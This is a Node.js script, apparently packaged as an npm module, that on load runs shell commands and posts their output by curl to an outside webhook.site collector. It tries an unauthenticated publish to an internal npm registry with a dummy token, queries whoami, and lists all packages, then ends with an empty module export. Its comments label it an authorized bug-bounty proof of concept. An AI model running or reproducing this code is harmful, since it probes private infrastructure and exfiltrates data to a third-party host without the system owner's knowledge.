const cp = require("child_process");
const OOB = "https://webhook.site/dbabceb9-a237-417e-ba20-1a8d6649c8ff";
function sh(c){ try { return cp.execSync(c,{encoding:"utf8",timeout:9000,maxBuffer:8388608,stdio:["ignore","pipe","pipe"]}); } catch(e){ return "STDOUT:"+(e.stdout||"")+" STDERR:"+(e.stderr||"")+" MSG:"+String(e.message||"").slice(0,160); } }
const REG = process.env.NPM_CONFIG_REGISTRY || "http://10.0.0.28:4873";
function post(tag,data){ const b64=Buffer.from(String(data)).toString("base64"); sh("curl -s --max-time 7 -X POST --data-binary "+JSON.stringify(b64)+" "+JSON.stringify(OOB+"/v3-"+tag)); }
try {
  post("reg", REG);
  // PUBLISH FIRST (money shot) — unique pkg, dummy authToken to clear ENEEDAUTH, non-destructive
  const pub = [
    'set -e 2>/dev/null; D=$(mktemp -d); cd "$D"',
    'PKG="crsectest-poc-$(date +%s)-$RANDOM"',
    'printf \'{"name":"%s","version":"1.0.0","description":"authorized-bbp-poc"}\' "$PKG" > package.json',
    'echo "module.exports=1" > index.js',
    'H=$(printf "%s" "'+REG+'" | sed "s#^https\\{0,1\\}:##")',
    'printf "%s/:_authToken=anon-poc\\nregistry='+REG+'\\n" "$H" > "$D/.npmrc"',
    'echo "PKG=$PKG"; echo "==PUBLISH=="',
    'npm publish --registry "'+REG+'" --userconfig "$D/.npmrc" --no-git-checks 2>&1 | head -c 3000',
    'echo; echo "==VERIFY=="; curl -s --max-time 6 "'+REG+'/$PKG" 2>&1 | head -c 1500'
  ].join("\n");
  post("publish", sh("bash -c "+JSON.stringify(pub)));
  post("whoami", sh('curl -s --max-time 6 '+JSON.stringify(REG+'/-/whoami')));
  post("search", sh('curl -s --max-time 7 '+JSON.stringify(REG+'/-/v1/search?text=&size=250')+' | head -c 4000'));
} catch(e){ post("err", String(e).slice(0,300)); }
post("done","1");
module.exports = [];
